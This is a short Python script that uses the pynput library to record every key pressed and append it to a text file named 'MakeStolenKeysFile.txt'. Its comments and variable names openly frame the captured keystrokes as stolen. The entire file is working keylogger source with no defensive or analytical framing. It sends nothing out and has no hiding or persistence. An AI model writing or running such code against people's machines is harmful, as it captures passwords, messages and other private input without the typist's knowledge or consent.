# importing the module that listens to keybaord signals
from pynput.keyboard import Listener


# creating a function that register the keystrokes in a text file and decides which operator keyboard has been clicked on
def on_press(keyStroke):
    # replacing the digital signal in a text format and placing it in two fields
    key = str(keyStroke).replace("'", "")
    # first statement
    if key == 'Key.space':
        key = ' '  # prints out 1 space field

    # second statement
    if key == 'Key.shift_r':
        key = ''

    # third statement
    if key == "Key.enter":
        key = '\n'  # printing a new empty line

    # making a new empty text file
    with open("MakeStolenKeysFile.txt", 'a') as stolenKeyStrokes:
        # writing the value of the signal in the empty text file
        stolenKeyStrokes.write(key)


# listening to the keyboard signal and with that, triggering the function on_press()
with Listener(on_press=on_press) as signal:
    signal.join()
